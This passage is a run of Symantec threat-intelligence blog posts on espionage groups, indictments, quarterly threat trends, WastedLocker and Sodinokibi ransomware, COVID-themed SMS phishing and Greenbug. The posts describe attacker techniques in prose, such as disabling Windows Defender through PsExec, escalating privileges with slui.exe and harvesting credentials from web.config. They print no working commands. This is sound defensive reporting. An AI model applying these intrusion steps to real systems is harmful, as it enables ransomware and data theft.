media company for a year, with activity on some machines there seen as recently as August 2020. Palmerworm also maintained a presence on the networks of a construction and a finance company for several months. However, it spent only a couple of days on the network of a Japanese engineering company in September 2019, and a couple of weeks on the network of an electronics company in March 2020. It spent approximately six months on one of the U. S.-based machines on which we observed activity. The finance, media, and construction industries, then, appear to be of the biggest interest to Palmerworm in this campaign. There have been reports previously of Palmerwormtargeting the media sector. While we cannot see what Palmerworm is exfiltrating from these victims, the group is considered an espionage group and its likely motivation is considered to be stealing information from targeted companies. While the custom malware used in this attack is not malware we have seen used by Palmerworm before, some of the samples identified in this research are detected by other vendors as PLEAD, which is a known Palmerworm (aka Blacktech) malware family. We also saw the use of infrastructure that has previously been attributed to Palmerworm. The group’s use of dual-use tools has also been seen in previous campaigns identified as being carried out by Palmerworm, while the location of its victims is also typical of the geography targeted by Palmerworm in past campaigns. The group’s use of stolen code-signing certificates has also been observed in previous Palmerworm attacks. These various factors make us reasonably confident we can attribute this activity to Palmerworm. Symantec does not attribute Palmerworm’s activity to any specific geography, however,Taiwanese officials have stated publiclythat they believe Blacktech, which we track as Palmerworm, is backed by the Chinese government. APT groups continue to be highly active in 2020, with their use of dual-use tools and living-off-the-land tactics making their activity ever harder to detect, and underlining the need for customers to have a comprehensive security solution in place that can detect this kind of activity. The following protections are in place to protect customers against Palmerworm activity: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "text": "UPDATE September 22:We have made some edits to this blog. An earlier version inaccurately described the links to the Elfin group as \"strong\". The U. S. government hasindicted three Iranian nationals on charges related to cyber attacks against aerospace and satellite technology companies. Said Pourkarim Arabi, Mohammad Reza Espargham, and Mohammad Bayati are alleged to have carried out a string of attacks between 2015 and 2019 which resulted in the theft of sensitive commercial information, intellectual property, and personal data from targeted organizations. According to the indictment, Arabi is a member of Iran’s Islamic Revolutionary Guard Corps (IRGC) and carried out the attacks with Espargham and Bayati on behalf of the IRGC. Espargham is alleged to be the leader of an Iranian hacking group known as the Iranian Dark Coders Team, while Bayati is alleged to be a malware developer who shared tools with Arabi and Espargham. The men are said to have obtained the names of individuals working in the aerospace and satellite industry, created fake accounts in their names, and used them to send spear-phishing emails to targeted organizations. If victims clicked on a malicious link within the email, malware would be installed on their computers. Once on the victim’s network, the attackers would escalate privileges, steal credentials, move laterally across the network, and deploy further malware on computers before exfiltrating data. Although not referenced specifically in the indictment, the attacks appear to have some links to the Elfin (aka APT33) cyber espionage group. Aside from the fact that the targets and tactics described in the indictment closely resemble Elfin activity observed by Symantec, there is also a commonality in tools used. According to the indictment, one of the main malware tools used in the attacks was the Nanocore RAT (Trojan. Nancrat). Although it was publicly available, Symantec has observed Elfin make extensive use of Nanocore. While we haven’t observed any other Iranian group utilizing this tool, other vendors have found cases. Symantec has been tracking Elfin since late 2015. Aside from compromising its victims with spear-phishing emails, the group is also known for scanning for vulnerable websites, either for potential victims or for use as command and control (C&C) infrastructure. To date it has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Aside from the U. S, Elfin is also heavily focused on targets in Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec between the start of 2016 and March 2019. During this time, Symantec also identifiedpossible links to the destructive Shamoon group. Symantec has observed multiple Elfin campaigns over the past 18 months. In February 2019, the group attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR in order to compromise an organization in the chemical sector in Saudi Arabia. In June 2019, Elfin sent out a phishing email to hundreds of recipients across multiple countries in what appeared to be an opportunistic trawling attack. The link within the document led recipients to dynamic DNS infrastructure controlled by the group. Subsequently, in late August 2019, Elfin compromised a victim in Saudi Arabia with a malicious HTA file. Following the initial compromise, Elfin continued to rely on the group’s known tools, tactics, and procedures (TTPs) to strengthen its foothold. During the incident, the legitimate utility mshta.exe executed a malicious HTA file with a job application theme. The file was downloaded after a victim used Microsoft Edge to visit a malicious website. A PowerShell command then downloaded a JPG file from a dynamic DNS host spoofing a U. S. defense contractor. In a separate announcement, the FBI hasalso issued a new cyber security advisory about an Iranian company called Rana Intelligence Computing Company, which it says is a front for the Chafer (aka APT39) cyber espionage group, which is linked to the Iranian Ministry of Intelligence and Security (MOIS). The FBI said Rana had systematically targeted and monitored Iranian citizens, dissidents, and journalists, along with government networks of Iran’s neighboring countries, and foreign organizations in the travel, academic, and telecommunications sectors. Simultaneously, the U. S. Treasury Department’s Office of Foreign Assets Control (OFAC)imposed sanctions on Rana, Chafer, and a number of named individuals who work for MOIS. Chafer has been active since at least July 2014 and its activitieswere first exposed by Symantec in December 2015, when it was found to be conducting targeted surveillance of domestic and international targets. In 2018 Symantecobserved it mounting a number of ambitious new attacksincluding the compromise of a major telecoms services provider in the Middle East. State-sponsored espionage actors appear to be firmly in the sights of the U. S. Justice and Treasury Departments. These indictments and sanctions may generate an unwelcome amount of publicity and disruption for groups that may have believed they were operating with a degree of anonymity.

    "text": "The U. S. governmenthas charged seven men in relation to hundreds of cyber attacks against organizations in the U. S. and multiple other countries in Asia and Europe. Two of the men, who were based in Malaysia, were arrested and their extradition to the U. S. has been requested. The other five are based in China and remain at large. The attacks were attributed to a China-linked organization dubbed APT41 and involved a combination of intellectual property theft and financially motivated cyber crime. While some of our peers monitor APT41 as a single operation, Symantec regards it as two distinct actors: Grayfly and Blackfly. Grayfly has been particularly active in recent years, mounting high volume espionage attacks against organizations spread across Asia, Europe, and North America. They are interested in a wide range of sectors, including food, financial, healthcare, hospitality, manufacturing, telecoms, and government. It is known for using the Barlaiy/POISONPLUG and Crosswalk/ProxIP (Backdoor. Motnug) malware families in its attacks. Victims are frequently compromised by exploiting public facing web servers. In recent attacks, Symantec has seen Grayfly deploy Backdoor. Motnug against targeted organizations in conjunction with publicly available Cobalt Strike malware. Backdoor. Motnug provides the attackers with comprehensive remote access to the network and creates proxy connections allowing access to hard-to-reach segments of a target network. In one attack against a telecoms provider, Grayfly was seen using an internal tool capable of interacting with an SMS database, demonstrating that intelligence gathering was the motive of the attack. Prosecutors in the U. S. have charged three Chinese men– Jiang Lizhi, Qian Chuan, and Fu Qiang – with involvement in attacks that involve Grayfly tools and tactics. The trio are based in the Chinese city of Chengdu and all hold senior positions in a company called Chengdu 404. The company describes itself as a network security specialist and claims to employ a team of white hat hackers who can perform penetration testing along with “offensive” and “defensive” security operations. The indictment alleges that the three men were also involved in attacks against over 100 different organizations in the U. S., South Korea, Japan, India, Taiwan, Hong Kong, Malaysia, Vietnam, India, Pakistan, Australia, the United Kingdom, Chile, Indonesia, Singapore, and Thailand. Jiang was said to have a “working relationship” with the Chinese Ministry of State Security which would provide him and his associates with a degree of state protection. Blackfly has been active since at least 2010 and is known for attacks involving the PlugX/Fast (Backdoor. Korplug), Winnti/Pasteboy (Backdoor. Winnti), and Shadowpad (Backdoor. Shadowpad) malware families. The group is best known for its attacks on the computer gaming industry. However, Symantec has also observed attacks on the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Recent Blackfly activity observed by Symantec saw the group deploy a slightly modified version of the Winnti malware against a telecoms organization in Taiwan. A feature of the attack was their use of the names of security vendors in naming files in an attempt to avoid raising suspicions. A dropper was signed with an invalid certificate with the subject \"McAfee, Inc.\" The dropper then delivered several DLLs with file names that referenced Symantec software. The attackers had not compromised Symantec software, and were not leveraging it in the attack. In a separate indictment, prosecutors allege that two Malaysian nationals – Wong Ong Hua and Ling Yang Ching –were involved in attacks that involved Blackfly tools and tactics. Wong is the founder and CEO of a company called Sea Gamer Mall, while Ling is its chief product officer and a shareholder. The duo are alleged to have collaborated with other attackers to mount a string of attacks against computer game companies in order to obtain in-game digital items, such as currencies, and then selling them for profit. While Grayfly and Blackfly appear to be distinct operations, the indictments allege that there is a link between the two groups. Two Chinese men – Zhang Haoran and Tan Dailin –are charged in a third indictment with collaborating with both groups. The two men are reported to have worked for a time at Chengdu 404, the company that prosecutors identify as linked to Grayfly attacks. However, they are also alleged to have collaborated with the charged Blackfly actors in order to make additional money by mounting attacks on computer gaming companies. The indictment alleges that in several instances, they used their unauthorized access to gaming company networks to kick other attackers off the network, effectively eliminating their competition. Grayfly and Blackfly have been prolific attackers in recent years and, while it remains to be seen what impact the charges will have on their operations, the publicity surrounding the indictments will certainly be unwelcome among attackers who wish to maintain a low profile. Symantec remains committed to tracking the activity of these groups in order to protect our customers from their attacks.

    "text": "As the first half of the year drew to a close, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out from April, May, and June 2020. From a resurgence in cryptojacking activity to the return of a major malware distribution platform, let’s take a quick look at the trends that shaped the cyber security threat landscape in the second quarter of 2020. After a sharp decline in cryptojacking following the shutdown of browser-based mining script maker CoinHive in March 2019, the second quarter of 2020 saw a resurgence in activity. Browser-based cryptojacking events blocked by Symantec saw a 163 percent increase in Q2 2020 compared to the previous quarter. This spike in activity coincides with an increase in the value of cryptocurrencies, including Bitcoin and Monero, which are two currencies often mined by browser-based coinminers. For more information on cryptojacking, read our blog: Cryptojacking: A Modern Cash Cow As countries around the world began easing COVID-19 lockdown restrictions, malware distributors also resumed working at full capacity. May and June saw a significant increase in the number of malware attacks blocked by Symantec, a division of Broadcom (NASDAQ: AVGO). In total, Symantec blocked over 60 million infection attempts in the second quarter of 2020, which represents a 74.6 percent increase over the previous quarter. For over a year, the Emotet botnet (Trojan. Emotet) has been subdued, with two long periods of inactivity: Between May and September 2019 and again between February and July 2020. This drop-off in activity is reflected in Symantec’s detections of new Emotet infections during this period. However, while activity for Q2 remained nominal, the botnet ramped up its activity in early Q3. Emotet's return is a source of concern, since it is a major malware distribution platform. For more information on Emotet, read our blog: The Evolution of Emotet: From Banking Trojan to Threat Distributor There was an increase in attacks using the targeted Sodinokibi ransomware (Ransom. Sodinokibi), also known as REvil, in the second quarter of 2020. Following a lull in March, activity began to increase again in April. By the end of Q2, Sodinokibi activity was up by over 630 percent, compared to the end of Q1. This ties in with research from Symantec in June which revealed a Sodinokibi campaign in which the attackers were using the Cobalt Strike commodity malware to deliver Sodinokibi to victims in the healthcare, services, and food sectors. For additional information on Sodinokibi, read our blog: Sodinokibi: Ransomware Attackers also Scanning for PoS Software, Leveraging Cobalt Strike A growing number of attacks in recent months have involved the use of Cobalt Strike (Backdoor. Cobalt), a multipurpose commodity malware available for purchase, most notably used in the WastedLocker (Ransom. WastedLocker) targeted ransomware attacks. Reflecting this trend, detections of intrusions involving confirmed Cobalt Strike usage are up significantly in the past two quarters. In many cases, Cobalt Strike is blocked by other detection technologies and signatures, meaning the true number of attacks involving this malware may be significantly higher. For more information on WastedLocker and its use of Cobalt Strike, read our blog: WastedLocker: Symantec Identifies Wave of Attacks Against U. S. Organizations The Lokibot information-stealing malware (Infostealer. Lokibot) saw a spike in activity in June, with blocked attacks increasing by almost 800 percent over the previous month. If this increased activity continues, Q3 could see Lokibot match or surpass activity seen in Q1. Lokibot, one of today’s most prevalent information-stealing threats, is often distributed via spam campaigns. Symantec recently began monitoring two new spam campaigns spreading Lokibot and targeting medium and large businesses around the world. One campaign involves the impersonation of a Saudi company specializing in industrial services and another impersonates a large shipping firm. The number of attacks against Symantec Internet of Things (IoT) honeypots* per day was down 12 percent in Q2 compared to Q1 2020. However, Q2 2020 still saw a greater number of attacks (14 percent more) compared to Q4 2019. While the numbers may be down, the risk of attack against internet-connected devices still remains high, as highlighted by a recent alert jointly released by the U. S. Cybersecurity and Infrastructure Security Agency (CISA) and the UK’s National Cyber Security Centre (NCSC) warning QNAP NAS device owners to update their devices in case QSnatch malware attacks restart. The number of unique IP addresses performing IoT attacks also fell in Q2, down 19 percent over the previous quarter. *Symantec’s IoT honeypots emulate protocols used by virtually all IoT devices, such as routers, connected cameras, digital video recorders, and so on. The top ten user names and passwords used in attacks on IoT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U. S. followed by China, Taiwan, Brazil, and Russia. Since attacks are carried out by botnets of infected IoT devices, these regions have the highest number of infected IoT devices.

Some of the organizations targeted by WastedLocker could have been compromised when an employee browsed the news on one of its websites. Symantec has notified the company and it has now removed the malicious code.

S. companies by attackers attempting to deploy the WastedLocker ransomware (Ransom. WastedLocker) on their networks. The end goal of these attacks is to cripple the victim’s IT infrastructure by encrypting most of their computers and servers in order to demand a multimillion dollar ransom. At least 31 customer organizations have been attacked, meaning the total number of attacks may be much higher. The attackers had breached the networks of targeted organizations and were in the process of laying the groundwork for staging ransomware attacks. WastedLocker is a relatively new breed of targeted ransomware,documented just prior to our publication by NCC Group, while Symantec was performing outreach to affected networks. WastedLocker has been attributed to the notorious “Evil Corp” cyber crime outfit. Evil Corp has previously been associated with theDridex banking Trojanand BitPaymer ransomware, which are believed to have earned their creators tens of millions of dollars. Two Russian men who are alleged to be involved in the grouphave open indictments against them in the U. S. The attacks begin with a malicious JavaScript-based framework known as SocGholish, tracked to more than 150 compromised websites, which masquerades as a software update. Once the attackers gain access to the victim’s network, they use Cobalt Strike commodity malware in tandem with a number of living-off-the-land tools to steal credentials, escalate privileges, and move across the network in order to deploy the WastedLocker ransomware on multiple computers. The attacks were proactively detected on a number of customer networks by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part ofSymantec’s Endpoint Security Completeoffering) who verified it and quickly realized it corresponded closely to publicly documented activity seen in the early stages of WastedLocker attacks. This discovery enabled us to identify further organizations that had been targeted by WastedLocker and identify additional tools, tactics, and procedures used by the attackers, helping us to strengthen our protection against every stage of the attack. Symantec has uncovered attacks against 31 organizations to date, all of which were located in the U. S. The vast majority of targets are major corporations, including many household names. Aside from a number of large private companies, there were 11 listed companies, eight of which are Fortune 500 companies. All but one of the targeted organizations are U. S. owned, with the exception being a U. S.-based subsidiary of an overseas multinational. Organizations in a diverse range of sectors were attacked. Manufacturing was the sector most affected, accounting for five targeted organizations. This was followed by Information Technology (four) and Media and Telecommunications (three). Had the attackers not been disrupted, successful attacks could have led to millions in damages, downtime, and a possible domino effect on supply chains. The initial compromise of an organization involves the SocGholish framework, which is delivered to the victim in a zipped file via compromised legitimate websites. Symantec has discovered at least 150 different legitimate websites that refer traffic to websites hosting the SocGholish zip file. It is possible that these websites lead to different malware, as such redirection services can be utilized by multiple actors at the same time. The zipped file contains malicious JavaScript, masquerading as a browser update. A second JavaScript file is then executed by wscript.exe. This JavaScript first profiles the computer using commands such as whoami, net user, and net group, then uses PowerShell to download additional discovery related PowerShell scripts. The next stage of the attack is to deploy Cobalt Strike. PowerShell is used to download and execute a loader from a domain publicly reported as being used to deliver Cobalt Strike as part of WastedLocker attacks. The loader also shared a command and control (C&C) domain with this reported Cobalt Strike infrastructure. The loader contained a . NET injector, also reportedly seen in WastedLocker attacks. The injector, along with the loader for Cobalt Strike Beacon, is reportedly taken from an open-source project called Donut, which is designed to help inject and execute in-memory payloads. The injected payload is known as Cobalt Strike Beacon and can be used to execute commands, inject other processes, elevate current processes or impersonate other processes, and upload and download files. The Get-NetComputer command fromPowerViewis renamed by the attackers to a random name. This command was then seen searching for all the computer objects in the Active Directory database with filter condition like *server* or *2003* or *7* (returning all Windows Server, Windows Server 2003, or Windows 7 instances). The attackers then logged this information in a .tmp file. Privilege escalation was performed usinga publicly documented techniqueinvolving the Software Licensing User Interface tool (slui.exe), a Windows command line utility that is responsible for activating and updating the Windows operating system. The attackers used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers, such as adding a new user or executing additional downloaded PowerShell scripts. Cobalt Strike was also used to carry out credential dumping using ProcDump and to empty log files. In order to deploy the ransomware, the attackers use the Windows Sysinternals tool PsExec to launch a legitimate command line tool for managing Windows Defender (mpcmdrun.exe) to disable scanning of all downloaded files and attachments, remove all installed definitions, and, in some cases, disable real-time monitoring. It is possible that the attackers use more than one technique to perform this task, since NCC reported suspected use of a tool called SecTool checker for this purpose. PsExec is then used to launch PowerShell which uses the win32_service WMI class to retrieve services and the net stop command to stop these services. After Windows Defender is disabled and services have been stopped across the organization, PsExec is used to launch the WastedLocker ransomware itself, which then begins encrypting data and deleting shadow volumes. The attackers behind this threat appear to be skilled and experienced, capable of penetrating some of the most well protected corporations, stealing credentials, and moving with ease across their networks. As such, WastedLocker is a highly dangerous piece of ransomware. A successful attack could cripple the victim’s network, leading to significant disruption to their operations and a costly clean-up operation. The following protections are in place to protect customers against WastedLocker attacks and associated activity: File-based protection Note: C&C domains linked to this activity have been reported by Symantec to the relevant registrar. We would like to thank Namecheap for their assistance in suspending some domains associated with this attack.

    "text": "Researchers at Symantec, a division of Broadcom (NASDAQ: AVGO), have spotted a Sodinokibi targeted ransomware campaign in which the attackers are also scanning the networks of some victims for credit card or point of sale (PoS) software. It is not clear if the attackers are targeting this software for encryption or because they want to scrape this information as a way to make even more money from this attack. The attackers are using the Cobalt Strike commodity malware to deliver the Sodinokibi targeted ransomware to victims. Eight organizations had the Cobalt Strike commodity malware on their systems, with three of the victims subsequently infected with the Sodinokibi ransomware. The victims infected with Sodinokibi were in the services, food, and healthcare sectors. The companies targeted in this campaign were primarily large, even multinational, companies, which were likely targeted because the attackers believed they would be willing to pay a large ransom to recover access to their systems. The attackers are aiming to make a lot of money - for victims infected with Sodinokibi the ransom requested is $50,000 in the Monero cryptocurrency if paid within the first three hours, and $100,000 after that. The attackers leverage legitimate tools in these attacks, and at one point we observed a legitimate remote admin client tool by NetSupport Ltd being used to install components during these attacks. In April, Symantec threat researchers found evidence of Sodinokibi attackers using similar tactics, when they spotted them using a copy of the AnyDesk remote access tool to deliver malware and other tools in at least two attacks. The attackers in this campaign also use ‘legitimate’ infrastructure to store their payload and for their command and control (C&C) server. The attackers are using code-hosting service Pastebin to host their payload (the Cobalt Strike malware and Sodinokibi) and are using Amazon’s CloudFront service for their C&C infrastructure, to communicate with victim machines. Pastebin and CloudFront are both legitimate services but have been observed being exploited by bad actors for similar malicious activity in the past. The advantage for malicious actors of using legitimate services to host payloads and for their C&C infrastructure is that traffic to and from a legitimate service is more likely to blend in with an organization’s legitimate traffic, and so is less likely to be flagged as suspicious and blocked. Cobalt Strike is an off-the-shelf tool that can be used to load shellcode onto victim machines; it has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors. The tactics used in this series of attacks are similar to tactics seen used in other targeted ransomware attacks before. Microsoft releasedresearchin April into attacks by six ransomware gangs, including Sodinokibi, and said that many of the groups employ similar tactics. The vector for most attacks observed by Microsoft was either the exploitation of vulnerable network devices or brute-force attacks on Remote Desktop Protocol (RDP) servers, and initial intrusion was followed by the use of living-off-the-land and commodity tools to perform credential theft and lateral movement before deploying the ransomware payload on multiple computers. So the tactics employed in this attack campaign are tactics commonly used by targeted ransomware gangs. Once on a network, the attackers take various steps to reduce the chance they will be detected and to increase the chances of their attack working. The attackers attempt to disable any security software on the machine so their activity can’t be detected. They also enable remote desktop connections so they can use them to launch malicious commands. The attackers also appear to be interested in stealing credentials on victim machines, and are observed adding user accounts, presumably in an attempt to maintain persistence on victim machines and also in a further attempt to keep a low profile on victim networks. We see the attackers using encoded PowerShell commands in some of these attacks. PowerShell is a Windows command line tool that has many legitimate purposes but is also frequently abused for nefarious purposes by malicious actors using living-off-the-land tactics. We see the Sodinokibi ransomware deployed on three of the victims that were infected with Cobalt Strike. Sodinokibi is a targeted ransomware - we saw targeted ransomware attacks increase by 62 percent in 2019, and targeted ransomware is one of the biggest threats on the cyber security landscape currently. Sodinokibi (aka REvil) first appeared in April 2019, but the actors behind it are widely believed to be the same actors who operated the GandCrab ransomware. GandCrab was a highly active targeted ransomware that first appeared in 2018. However, in June 2019 its operatorsannounced that they were ‘retiring’, claiming that they had made more than $2 billion from the ransomware. However, it’s widely thought that they simply turned their focus to the Sodinokibi ransomware instead. Sodinokibi was originally believed to be operated by one group but it is now thought to operate as a ransomware-as-a-service (RaaS), where one group maintains the code and rents it out to other groups, known as affiliates, who carry out attacks and spread the ransomware. Any profits made are then split between the affiliates and the original gang. Since it appeared on the scene, Sodinokibi has been one of the most prolific targeted ransomware strains and has been seen in numerous high-profile incidents. Actors using Sodinokibi were apparently responsible for thehack of foreign exchange service Travelexon New Year’s Eve. The attack left the company offline for almost a month and caused huge disruption to its business, according to public reports. The attackers were said to have demanded a ransom of $6 million in that incident, with Travelex reportedlyeventually paying $2.3 millionto regain access to its systems. In January, it was reported that Sodinokibi’saverage ransom demand was $260,000, so this was a huge ransom. Sodinokibi hit several other high-profile companies in the last year and, similar to the Maze ransomware group, announced in December 2019 that it would release data stolen from victims if its ransom demands weren’t met. Since that announcement, the gang has been observed offering the data of victims for sale on hacking forums, and at the beginning of Junean auction site was launchedwhere the group said it will sell off stolen data to the highest bidder. The three victims that were infected with Sodinokibi in this campaign were in the services, food, and healthcare sectors. The food and the services companies that were infected were both large, multi-site organizations that were likely capable of paying a large ransom - the type of company that would typically be targeted with Sodinokibi. However, the healthcare organization appears to have been a smaller operation. Interestingly, this victim’s systems were also scanned by the attackers for PoS software. It may be that the attackers realized this business might not be in a position to pay the large ransoms usually demanded in a Sodinokibi attack, and so scanned for PoS software to determine if they could profit from the compromise in another way, or they may have been scanning for this kind of software simply to encrypt it too. The attackers requested that the ransom be paid in the Monero cryptocurrency, which is favored for its privacy as, unlike Bitcoin, you cannot necessarily track transactions. For this reason we do not know if any of the victims paid the ransom, which was $50,000 if paid in the first three hours, rising to $100,000 after that time. While many of the elements of this attack are ‘typical’ tactics seen in previous attacks using Sodinokibi, the scanning of victim systems for PoS software is interesting, as this is not typically something you see happening alongside targeted ransomware attacks. It will be interesting to see if this was just opportunistic activity in this campaign, or if it is set to be a new tactic adopted by targeted ransomware gangs. One thing that is clear is the actors using Sodinokibi are sophisticated and skilled and show no sign that their activity is likely to decrease anytime soon. The companies targeted with this ransomware tend to be large corporate organizations, so companies like this need to be aware of the threat posed by this kind of activity. Trojan.

    "text": "Towards the end of the first quarter of 2020, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out. From COVID-19-themed malicious email and BEC scams to vulnerability exploits and IoT attacks, let’s take a quick look at the trends that shaped the cyber security threat landscape in the first three months of 2020. While news of the coronavirus pandemic began to circulate in December 2019, it was March 2020 before the subject began to be used noticeably as a lure in malware-bearing emails. In February, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked approximately 5,000 malicious emails with “coronavirus”, “corona”, or “COVID-19” in the subject line. However, in March this number increased significantly to roughly 82,000. More information on this trend can be found in our blogCOVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns. According to the FBI, business email compromise (BEC) scams are the most damaging and effective type of cyber crime, accounting for over $1.77 billion in losses for victims last year. While the number of organizations targeted by BEC scams was down from Q4 2019 numbers, there were still almost 31,000 organizations targeted in Q1 2020. The number of unique websites compromised with formjacking code increased in Q1 2020 as more criminals vie for their share of this lucrative malicious activity. There were 7,836 websites compromised with formjacking code in Q1 2020, up from 7,663 the previous quarter. To learn more about formjacking, read our white paper:How Malicious JavaScript Code is Stealing User Data from Thousands of Websites Each Month A directory traversal vulnerability in Citrix Application Delivery Controller and Citrix Gateway (CVE-2019-19781) was disclosed on December 17, 2019. Patches for the flaw, which could permit a remote attacker to execute arbitrary code on vulnerable computers, were not rolled out until January 2020. There was a spike in exploit attempts for this vulnerability immediately after its disclosure, peaking in February with over 492,000 attempts blocked by Symantec (Web Attack: Citrix ADC RCE CVE-2019-19781). Microsoft’s first Patch Tuesday release of 2020 disclosed a serious vulnerability in Windows CryptoAPI (CVE-2020-0601), a core component of the Windows operating system that handles cryptographic operations. Hackers were again quick to incorporate this vulnerability into their attacks, with blocked exploit attempts (Web Attack: Microsoft Windows CVE-2020-0601) reaching almost 82,500 in January. Attempts to exploit these vulnerabilities were blocked by Symantec’s Intrusion Prevention System (IPS). After declining markedly in 2019, phishing increased significantly during the first quarter of 2020, accounting for 1 in every 4,200 emails. Phishing activity is now back up to near where it was during 2018. The availability of more sophisticated phishing kits on the cyber underground may be driving a renewed interest in this form of attack. Some of the increase may also be accounted for by the upsurge in COVID-19-themed email attacks. The number of attacks against Symantec IOT honeypots* was up 13 percent in Q1 compared to Q4 of 2019. *Symantec’s IOT honeypots emulate protocols used by virtually all IOT devices, such as routers, connected cameras, digital video recorders, and so on. However, the number of unique IP addresses performing IOT attacks fell by 14 percent in the same period, indicating that while IoT botnets may be more aggressive in performing attacks, their relative size has fallen. The top ten passwords used in attacks on IOT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U. S. followed by China, Vietnam, Taiwan, and South Korea. Since attacks are carried out by botnets of infected IOT devices, these countries have the highest number of infected IOT devices.

    "text": "As with all major newsworthy events, it was inevitable that criminals would take advantage of the COVID-19 pandemic. Symantec, a division of Broadcom (NASDAQ: AVGO), has already published blogs detailing how spammers and scammers are using coronavirus-themed lures in theirmalicious email campaigns, and how maliciousAndroid apps are also exploiting the outbreak. However, a more direct method to target people, and one that is arguably more trusted by users, is via text (SMS) messages sent to mobile phones. With this in mind, we analyzed links contained within more than 3 million SMS messages from hundreds of thousands of mobile devices from around the world that use Symantec’s mobile security technologies. Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. While malicious SMS messages often use URL shortening services to evade detection and hide destination URLs that would otherwise appear risky, our technologies follow the attack trail to the final URL destination. We first began monitoring and evaluating the risk of COVID-19 related SMS messages soon after news of the virus began circulating in December 2019. We observed the first high-risk SMS phishing attack using COVID-19 as bait on January 24, 2020, roughly around the same period as the virus began to receive more media coverage. Up until March, we observed very few incidents of SMS phishing attacks using COVID-19 as bait. From late January to early March, only 1 in 500 (0.2 percent) COVID-19 related SMS messages were rated as high risk. However, COVID-19 SMS messages sent by scammers followed the same trend line as the coronavirus outbreak, which was officially declared a pandemic in March 2020. The number of high-risk COVID-19 SMS messages quickly increased after this, and by the third week of March, roughly 1 in 20 (5 percent) messages were categorized as a phishing attack or other type of high-risk attack. We observed several types of COVID-19 related SMS phishing scams. The criminals behind these scams all use the same tactic; taking advantage of people’s fears and financial hardships during the global pandemic in order to lure them in. The following are just three examples of financial-themed SMS phishing scams that use COVID-19 related lures (Note: Symantec’s mobile security technologies do not collect user-identifying information from SMS messages): Message:(Notification - ALERT ) Dear client, Scotiabank is working with the Government to make the Emergency Covid-19 Benefits deposits easier.

    "text": "The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020. There are indications that at least one of the companies was first targeted as early as April 2019. Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials. Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it wasnever clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization’s network prior to a wiping attack that involved W32. Disttrack. B (Shamoon’s malware). This link was never definitively established, but cooperation between the two groups is considered a possibility. Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks. Across multiple victim machines, a file named proposal_pakistan110.chm:error.html was executed via an internet browser. We also see the same file being opened by archiver tools. While we were unable to retrieve the file for analysis, the same technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets containing a link to a likely compromised site, which hosted an archive file. This archive contains a malicious CHM file (compiled HTML Help file), which includes an ADS (alternative data steam) to hide its payload, which is installed when executed. This file usually also contains a decoy PDF file containing an error message that says the file could not be opened correctly. We have also seen similarly named files used in other organizations in the past to drop Trojan. Ismdoor, Greenbug’s custom malware. Around the same time as we saw this file, a file called GRUNTStager.hta was also executed. Symantec believes the attackers used the publically availableCovenant post-exploitation frameworkin order to gain an initial foothold in their target organizations. Covenant is a publicly available hack tool that is described as “a . NET command and control framework that aims to highlight the attack surface of . NET, make the use of offensive . NET tradecraft easier, and serve as a collaborative command and control platform.” It is described as being for use by “red teams,” but is also open to being abused by malicious actors. Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in gaining access to the organization’s database server. The attackers were observed executing various PowerShell commands on the victim system. The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a CobaltStrike Beacon module to download the next stage payload. We were able to extract two command and control (C&C) server addresses from the PowerShell command. Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via $PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same previously mentioned C&C server. This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the attackers were also observed attempting to perform a download to CSIDL_APPDATA\\a8f4.exe via the bitsadmin utility The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the compromised machine. A short time later, the attackers executed several tools from CSIDL_SYSTEM86\\[REDACTED] directory: The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1. This command was executed several times and is likely used to install a Metasploit payload to retain access to the compromised machine. That is the last activity seen on that day. No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The PowerShell command follows the execution of the w3wp.exe process – an application that is used to serve requests to a web application. This may indicate that the attackers have used a webshell on the compromised machine. The following is a copy of the PowerShell command executed by the attackers: This command is used to search for files similar to web.config. For each file found, it extracts username and password information where possible, decrypting it using theaspnet_regiis.exeutility. These 